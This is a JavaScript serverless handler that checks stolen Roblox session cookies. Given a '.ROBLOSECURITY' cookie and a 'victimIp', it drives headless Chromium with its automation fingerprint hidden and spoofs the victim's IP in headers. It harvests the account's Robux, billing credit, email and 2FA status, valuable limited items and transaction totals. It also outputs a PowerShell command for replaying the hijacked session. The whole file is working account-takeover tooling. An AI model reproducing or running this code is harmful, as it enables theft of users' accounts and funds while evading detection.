// api/scrape.js
// Headless Chromium on Vercel — intercepts Roblox's own frontend API calls.
// Cookie stays alive because we browse exactly like a real user.
// deps: @sparticuz/chromium  puppeteer-core

import chromium from '@sparticuz/chromium';
import puppeteer from 'puppeteer-core';

// ── PowerShell builder ────────────────────────────────────────────────────────
function buildPowerShell(cookie) {
  const esc = cookie.replace(/`/g, '``').replace(/"/g, '`"');
  return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${esc}", "/", "roblox.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
-WebSession $session \`
-Headers @{
  "authority"="www.roblox.com"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  "accept-language"="en-US,en;q=0.9"
  "cache-control"="max-age=0"
  "referer"="https://www.roblox.com/"
  "sec-ch-ua"='"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"'
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"='"Windows"'
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="same-origin"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}`;
}

// ── Body parser ───────────────────────────────────────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

// ── Wait helper ───────────────────────────────────────────────────────────────
const wait = ms => new Promise(r => setTimeout(r, ms));

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'POST only' });

  const { cookie, victimIp } = parseBody(req.body);
  if (!cookie) return res.status(400).json({ error: 'cookie required' });

  let browser = null;

  try {
    // ── Launch headless Chrome ──────────────────────────────────────────────
    browser = await puppeteer.launch({
      args: [
        ...chromium.args,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-blink-features=AutomationControlled',  // hide webdriver flag
        '--window-size=1280,720'
      ],
      defaultViewport: { width: 1280, height: 720 },
      executablePath: await chromium.executablePath(),
      headless: chromium.headless,
      ignoreHTTPSErrors: true,
    });

    const page = await browser.newPage();

    // ── Hide automation fingerprint ─────────────────────────────────────────
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
      Object.defineProperty(navigator, 'plugins',   { get: () => [1, 2, 3, 4, 5] });
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
      window.chrome = { runtime: {} };
    });

    await page.setUserAgent(
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    );

    if (victimIp) {
      await page.setExtraHTTPHeaders({
        'X-Forwarded-For': victimIp,
        'X-Real-IP':       victimIp
      });
    }

    // ── Set up response interceptor before any navigation ──────────────────
    const cap = {};   // captured API responses

    page.on('response', async response => {
      const url = response.url();
      if (!url.includes('roblox.com')) return;
      try {
        const ct = response.headers()['content-type'] || '';
        if (!ct.includes('json')) return;
        const json = await response.json().catch(() => null);
        if (!json) return;

        if      (url.includes('/v1/users/authenticated'))                           cap.auth      = json;
        else if (url.includes('/v1/user/currency'))                                 cap.currency  = json;
        else if (url.includes('validate-membership'))                               cap.premium   = json;
        else if (url.includes('/v1/email'))                                         cap.email     = json;
        else if (url.includes('twostepverification'))                               cap.tfa       = json;
        else if (url.includes('/friends/count'))                                    cap.friends   = json;
        else if (url.includes('/groups/roles'))                                     cap.groups    = json;
        else if (url.includes('avatar-headshot'))                                   cap.avatar    = json;
        else if (url.includes('billing.roblox.com/v1/credit'))                     cap.billing   = json;
        else if (url.includes('/assets/collectibles') && !cap.limiteds)            cap.limiteds  = json;
        else if (url.includes('transaction-totals')) {
          try {
            const tf = new URL(url).searchParams.get('timeFrame');
            if (tf) { cap.tx = cap.tx || {}; cap.tx[tf] = json; }
          } catch (_) {}
        }
        else if (url.includes('/groups/') && url.includes('/currency'))            cap.groupCurr = json;
      } catch (_) {}
    });

    // ── Plant the cookie ────────────────────────────────────────────────────
    await page.setCookie({
      name:     '.ROBLOSECURITY',
      value:    cookie,
      domain:   '.roblox.com',
      path:     '/',
      httpOnly: true,
      secure:   true,
      sameSite: 'None'
    });

    // ── PAGE 1: Home — triggers auth, robux, avatar, friends, groups ────────
    await page.goto('https://www.roblox.com/home', {
      waitUntil: 'networkidle2',
      timeout:   30000
    });
    await wait(2000); // let lazy-loaded widgets fire

    // Bail early if not logged in
    if (!cap.auth?.id) {
      return res.status(200).json({ valid: false, error: 'Cookie invalid or expired' });
    }

    const uid = cap.auth.id;

    // ── PAGE 2: Account settings — email, 2FA, premium details ────────────
    if (!cap.email || !cap.tfa) {
      await page.goto('https://www.roblox.com/my/account#!/info', {
        waitUntil: 'networkidle2',
        timeout:   20000
      });
      await wait(1500);
    }

    // ── Build result ────────────────────────────────────────────────────────
    const groups      = cap.groups?.data    || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    const limiteds    = cap.limiteds?.data  || [];
    const rap         = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
    const names       = limiteds.map(i => (i.name || '').toLowerCase());

    const txDay   = cap.tx?.Day   || {};
    const txWeek  = cap.tx?.Week  || {};
    const txMonth = cap.tx?.Month || {};
    const txYear  = cap.tx?.Year  || {};

    return res.status(200).json({
      valid:         true,
      id:            uid,
      username:      cap.auth.name,
      displayName:   cap.auth.displayName,
      robux:         cap.currency?.robux     || 0,
      credit:        cap.billing?.balance    || 0,
      isPremium:     cap.premium === true,
      accountAgeDays: cap.auth?.created
        ? Math.floor((Date.now() - new Date(cap.auth.created).getTime()) / 86400000)
        : 'N/A',
      friends:       cap.friends?.count      || 0,
      groupsOwned:   ownedGroups.length,
      groupRobux:    cap.groupCurr?.robux    || 0,
      limitedsCount: limiteds.length,
      limitedsValue: rap,
      hasHeadless:   names.some(n => n.includes('headless')),
      hasKorblox:    names.some(n => n.includes('korblox')),
      emailSet:      cap.email?.emailAddress ? 'Set ✅'      : 'Not Set ❌',
      emailVerified: cap.email?.verified     ? 'Verified ✅' : 'Unverified ❌',
      twoFA:         (cap.tfa?.methods?.length || 0) > 0 ? 'Enabled ✅' : 'Disabled ❌',
      avatarUrl:     cap.avatar?.data?.[0]?.imageUrl
                     || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png',
      txDay:         txDay.incomingRobuxTotal   || 0,
      txWeek:        txWeek.incomingRobuxTotal  || 0,
      txMonth:       txMonth.incomingRobuxTotal || 0,
      txYear:        txYear.incomingRobuxTotal  || 0,
      powershell:    buildPowerShell(cookie),
      // raw captures for debugging
      _captured: Object.keys(cap)
    });

  } catch (err) {
    console.error('Scrape error:', err.message);
    return res.status(200).json({ valid: false, error: err.message });
  } finally {
    if (browser) {
      try { await browser.close(); } catch (_) {}
    }
  }
}
